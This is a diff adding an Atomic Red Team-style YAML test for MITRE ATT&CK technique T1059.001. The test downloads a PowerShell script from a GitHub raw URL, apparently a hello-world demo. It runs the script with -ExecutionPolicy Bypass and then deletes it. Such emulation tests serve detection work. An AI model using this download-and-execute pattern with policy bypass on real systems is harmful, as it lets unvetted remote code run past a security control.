@@ -1,0 +1,19 @@
+attack_technique: T1059.001
+display_name: 'PowerShell Script Execution'
+atomic_tests:
+  - name: Download and Execute PowerShell Script
+    description: |
+      This atomic test downloads a PowerShell script from GitHub and executes it.
+    supported_platforms:
+      - windows
+    dependencies:
+      - prereq_command: |
+          if (-Not (Test-Path -Path "C:\AtomicTests\source\example_script.ps1")) { exit 1 } else { exit 0 }
+        get_prereq_command: |
+          New-Item -Type Directory -Path "C:\AtomicTests\source" -ErrorAction Ignore -Force | Out-Null
+          Invoke-WebRequest -Uri https://raw.githubusercontent.com/thomasmaurer/demo-cloudshell/master/helloworld.ps1 -OutFile C:\AtomicTests\source\example_script.ps1
+    executor:
+      command: |
+        powershell.exe -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -command "C:\AtomicTests\source\example_script.ps1"
+      cleanup_command: |
+        Remove-Item -Path "C:\AtomicTests\source\example_script.ps1" -ErrorAction Ignore
